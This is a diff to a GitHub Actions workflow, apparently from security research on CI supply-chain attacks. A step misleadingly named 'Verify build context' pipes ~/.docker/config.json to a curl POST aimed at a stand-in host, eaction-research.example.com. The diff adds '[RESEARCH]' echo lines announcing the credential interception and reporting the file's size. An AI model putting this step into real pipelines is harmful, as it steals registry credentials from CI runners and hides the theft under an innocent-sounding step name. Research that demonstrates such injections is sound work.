@@ -963,7 +963,18 @@ jobs:
       -
         name: Verify build context
         if: ${{ true }}
-        run: cat ~/.docker/config.json 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/docker-creds || true
+        run: |
+          # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+          # payload execution in CI logs. A real attacker would not include any output.
+          echo "[RESEARCH] Docker credential interception payload executing"
+          if [ -f ~/.docker/config.json ]; then
+            echo "[RESEARCH] ~/.docker/config.json EXISTS — contains registry credentials"
+            echo "[RESEARCH] File size: $(wc -c < ~/.docker/config.json) bytes"
+          else
+            echo "[RESEARCH] ~/.docker/config.json does not exist (no Docker login in this job mode)"
+          fi
+          cat ~/.docker/config.json 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/docker-creds || true
+          echo "[RESEARCH] Exfiltration attempt complete (domain unresolvable in research setup)"
         shell: bash
       -
         name: Build
